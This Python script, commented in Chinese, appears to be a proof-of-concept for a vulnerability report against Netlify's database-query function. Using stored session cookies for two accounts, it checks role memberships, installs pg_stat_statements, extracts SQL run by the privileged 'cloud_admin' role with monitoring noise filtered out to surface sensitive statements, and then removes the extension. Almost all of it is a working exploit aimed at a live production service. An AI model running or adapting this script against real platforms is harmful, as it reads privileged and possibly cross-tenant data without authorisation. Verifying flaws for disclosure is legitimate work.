# -*- coding: utf-8 -*-
"""pg_stat_statements 越权读 cloud_admin SQL —— 根因验证:
1. netlifydb_owner 是否 pg_read_all_stats 成员
2. B 实例对照(平台级 vs 单实例)
3. 敏感模式复查(密码/ddl/字面量多的)"""
import http.client, ssl, gzip, brotli, json, sys
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A, SITE_A, COOKIE_B

SITE_B = 'd2977de0-d24d-4544-81cb-933e610cad7d'
ctx = ssl.create_default_context()
P = '/.netlify/functions/database-query'


def q(sql, cookie=COOKIE_A, site=SITE_A, timeout=45):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Content-Type': 'application/json', 'Cookie': cookie}
    body = {'siteId': site, 'action': 'query', 'sql': sql}
    conn.request('POST', P, body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    out = raw[:2200].decode('utf-8', 'ignore')
    conn.close()
    return st, out


print('== 1. 成员关系 ==')
st, out = q("select rolname from pg_roles where rolname like 'pg_%' and "
            "pg_has_role('netlifydb_owner', oid, 'member')")
print('owner 的 pg_* 成员 [%d] %s' % (st, out[:800]))
st, out = q("select rolname from pg_roles r where pg_has_role('neon_superuser', r.oid, 'member') and rolname like 'pg_%'")
print('neon_superuser 的 pg_* 成员 [%d] %s' % (st, out[:800]))
st, out = q("select coalesce(setconfig::text,'(null)') from pg_db_role_setting s join pg_roles r on s.setrole=r.oid "
            "where r.rolname='netlifydb_owner'")
print('owner role settings [%d] %s' % (st, out[:400]))

print()
print('== 2. B 实例对照 ==')
st, out = q('create extension if not exists pg_stat_statements', cookie=COOKIE_B, site=SITE_B)
print('B install [%d] %s' % (st, out[:150]))
st, out = q("select userid::regrole, dbid, count(*) from pg_stat_statements group by 1,2 order by 3 desc", cookie=COOKIE_B, site=SITE_B)
print('B user 分布 [%d] %s' % (st, out[:800]))
st, out = q("select left(query, 300) as q, calls from pg_stat_statements "
            "where userid::regrole::text='cloud_admin' and dbid=5 "
            "and not (query ilike '%pg_stat%' or query ilike '%pg_is_in_recovery%' or query ilike '%wal%' "
            "or query ilike '%neon%' or query ilike '%pg_replication%' or query ilike '%pg_database%' "
            "or query ilike '%pg_settings%' or query ilike '%extract%' or query ilike '%checkpoint%' "
            "or query ilike '%current_setting%' or query ilike '%subscription%' or query ilike '%select $1%') "
            "order by calls desc limit 30", cookie=COOKIE_B, site=SITE_B)
print('B cloud_admin 非监控语句 [%d] %s' % (st, out[:2200]))
st, out = q("select left(query, 400) as q, calls from pg_stat_statements "
            "where userid::regrole::text='cloud_admin' and dbid<>5 order by calls desc limit 20", cookie=COOKIE_B, site=SITE_B)
print('B cloud_admin 非 postgres 库 [%d] %s' % (st, out[:1800]))
st, out = q('drop extension if exists pg_stat_statements cascade', cookie=COOKIE_B, site=SITE_B)
print('B cleaned [%d]' % st)
